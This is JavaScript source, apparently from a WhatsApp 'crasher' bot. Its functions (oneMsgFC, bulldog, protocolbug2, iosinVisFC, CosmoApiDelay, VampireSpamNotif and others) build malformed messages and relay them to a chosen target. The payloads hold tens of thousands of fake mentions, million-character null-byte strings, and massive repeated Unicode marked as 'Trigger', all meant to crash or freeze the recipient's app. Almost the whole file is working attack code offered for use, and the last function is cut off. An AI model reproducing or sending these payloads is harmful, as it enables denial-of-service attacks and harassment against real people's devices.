                    "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                  caption: "This is an ad caption",
                },
                placeholderKey: {
                  remoteJid: target,
                  fromMe: false,
                  id: "ABCDEF1234567890",
                },
                expiration: 86400,
                ephemeralSettingTimestamp: "1728090592378",
                ephemeralSharedSecret:
                  "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
                externalAdReply: {
                  title: "ᐯᗩᗰᑭIᖇᗴ IOՏ̊‏‎",
                  body: "ᐯᗩᗰᑭIᖇᗴ IOՏ‏‎",
                  mediaType: "VIDEO",
                  renderLargerThumbnail: true,
                  previewTtpe: "VIDEO",
                  thumbnail:
                    "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                  sourceType: " x ",
                  sourceId: " x ",
                  sourceUrl: "https://wa.me/settings",
                  mediaUrl: "https://wa.me/settings",
                  containsAutoReply: true,
                  showAdAttribution: true,
                  ctwaClid: "ctwa_clid_example",
                  ref: "ref_example",
                },
                entryPointConversionSource: "entry_point_source_example",
                entryPointConversionApp: "entry_point_app_example",
                entryPointConversionDelaySeconds: 5,
                disappearingMode: {},
                actionLink: {
                  url: "https://wa.me/settings",
                },
                groupSubject: "Example Group Subject",
                parentGroupJid: "6287888888888-1234567890@g.us",
                trustBannerType: "trust_banner_example",
                trustBannerAction: 1,
                isSampled: false,
                utm: {
                  utmSource: "utm_source_example",
                  utmCampaign: "utm_campaign_example",
                },
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "6287888888888-1234567890@g.us",
                  serverMessageId: 1,
                  newsletterName: " X ",
                  contentType: "UPDATE",
                  accessibilityText: " X ",
                },
                businessMessageForwardInfo: {
                  businessOwnerJid: "0@s.whatsapp.net",
                },
                smbClientCampaignId: "smb_client_campaign_id_example",
                smbServerCampaignId: "smb_server_campaign_id_example",
                dataSharingContext: {
                  showMmDisclosure: true,
                },
              },
            },
          },
          {
            participant: { jid: target },
            userJid: target,
          }
        );
      } catch (err) {
        console.log(err);
      }
    }
async function oneMsgFC(target) {
  const AtaaUrl = 'https://files.catbox.moe/ncblg3.mp4';
  const jid = "62801000171360@s.whatsapp.net";
  const video = await prepareWAMessageMedia(
    { video: { url: AtaaUrl } },
    { upload: sock.waUploadToServer }
  );

  const videoMessage = {
    videoMessage: video.videoMessage,
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: String(Date.now()),
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "",
          contextInfo: {
            mentionedJid: [jid],
            externalAdReply: {
              title: "",
              body: "",
              thumbnailUrl: "",
              mediaType: 1,
              sourceUrl: "https://t.me/spartanupdate",
              showAdAttribution: false
            }
          }
        }
      }
    }
  };

  const cards = [];
  for (let i = 0; i < 10; i++) {
    cards.push({
      header: videoMessage,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000)
      }
    });
  }

  const interactive = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: { text: "" },
          carouselMessage: {
            cards: cards,
            messageVersion: 1
          },
          contextInfo: {
            businessMessageForwardInfo: {
              businessOwnerJid: jid
            },
            stanzaId: String(Math.floor(Math.random() * 99999)),
            forwardingScore: 100,
            isForwarded: true,
            mentionedJid: [jid],
            externalAdReply: {
              title: "",
              body: "",
              thumbnailUrl: "https://spartan.web.id",
              mediaType: 1,
              mediaUrl: "",
              sourceUrl: "https://github.com/ataaxd",
              showAdAttribution: false
            }
          }
        }
      }
    }
  };

  const message = generateWAMessageFromContent(target, interactive, { quoted: nata });

  await sock.relayMessage(target, message.message, {
    participant: { jid: target },
    messageId: message.key.id
  });
}
async function bulldog(target, mention = true) { // Default true biar otomatis nyala
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
    async function protocolbug2(target, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "⎋ 𝐅𝐢𝐍𝐈𝐗͜͢-‣",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "𝐁𝐞𝐭𝐚 𝐏𝐫𝐨𝐭𝐨𝐜𝐨𝐥 - 𝟗𝟕𝟒𝟏" },
                        content: undefined
                    }
                ]
            }
        );
    }
}
async function iosinVisFC(target, mention) {
const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000); // Trigger1
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), // Trigger2
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), // Trigger 3
         url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, //Trigger 4
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "𝔗𝔥𝔦𝔰 ℑ𝔰 𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + TravaIphone, //Trigger 5
            matchedText: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),//Trigger 6
            title: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + "𑇂𑆵𑆴𑆿".repeat(15000),//Trigger 7
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
   } catch (err) {
      console.error(err);
   }
};
async function CosmoApiDelay(target, mention = true) { // Default true biar otomatis nyala
    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "RyuuX🫀",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "Dont Bothering Me Bro!!!"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statuSerentributionType: 2
        }
    };
  

    const msg = generateWAMessageFromContent(target, MSG, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    // **Cek apakah mention true sebelum menjalankan relayMessage**
    if (mention) {
        await sock.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Hades Here Bro" },
                        content: undefined
                    }
                ]
            }
        );
    }
}
async function AudioVisualXDellay(target) {
  const msg = {
    to: target,
    message: {
      viewOnceMessage: {
        message: {
          videoMessage: {
            caption: "꧔꧈".repeat(600),
            mimetype: "video/mp4",
            fileName: "𝐁𝐥𝐨𝐚𝐝 𝐈𝐧𝐟𝐢𝐧𝐢𝐭𝐲 🇷🇺", 
            fileLength: "9999999999",
            seconds: 999999,
            mediaKey: "v/J9vWyG92CnR0fqagJ7GBxQzmDG3+cV+DBL1yyECBI=",
            contextInfo: {
              forwardingScore: 9999,
              isForwarded: true
            }
          }
        }
      },
      audioMessage: {
        mimetype: "audio/ogg; codecs=opus",
        ptt: true,
        seconds: 9999,
        fileName: "𝐁𝐥𝐨𝐚𝐝 𝐈𝐧𝐟𝐢𝐧𝐢𝐭𝐲 🇷🇺" + "꧔꧈".repeat(500),
        fileLength: "9999999999",
        mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=", 
        contextInfo: {
          forwardingScore: 9999,
          isForwarded: true,
          mentionedJid: [
            ...Array.from({ length: 35000 }, () =>
              `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
            )
          ]
        }
      }
    }
  };

  await sock.sendMessage(msg.to, msg.message);
}
async function yudikon(target) {
  await sock.relayMessage(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "{",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\0".repeat(1000000),
            version: 3
          }
        }
      }
    }
  }, {
    participant: {
      jid: target
    }
  });
  console.log(chalk.yellow("𝐗‌𝐎‌𝐏𝐎𝐖‌𝐍 ༑⿻ SUCCES SENDED🦠"));
}
async function VampireSpamNotif(target, Ptcp = true) {
    await sock.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "9999999999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "𝚅𝙰𝙼𝙿𝙸𝚁𝙴 𝙲𝚁𝙰𝚂𝙷𝙴𝚁.",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "𝙷𝙸...𝙸'𝙼 𝚅𝙰𝙼𝙿𝙸𝚁𝙴" ,
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "ꦽ".repeat(50000) + "_*~@8~*_\n".repeat(50000) + '@8'.repeat(50000),
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function SpamNotif(target, Ptcp = true) {
    await sock.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30623531_8925861100811717_6603685184702665673_n.enc?ccb=11-4&oh=01_Q5AaIN8EZu9FKxglUrb240_UXS3DGwZHc6a_fKzCxAbB1DFB&oe=675EE231&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/json",
                            fileSha256: "ZUQzs6adM+DC5ZI3MuHr3RbsAaj66LvmZ1R8+El5cqc=",
                            fileLength: "401",
                            pageCount: 0,
                            mediaKey: "X6f0YZpo7xItqTXuawYmZJy6eLaXv9m/1nFZq2rW7p0=",
                            fileName: "😘😘".repeat(10),
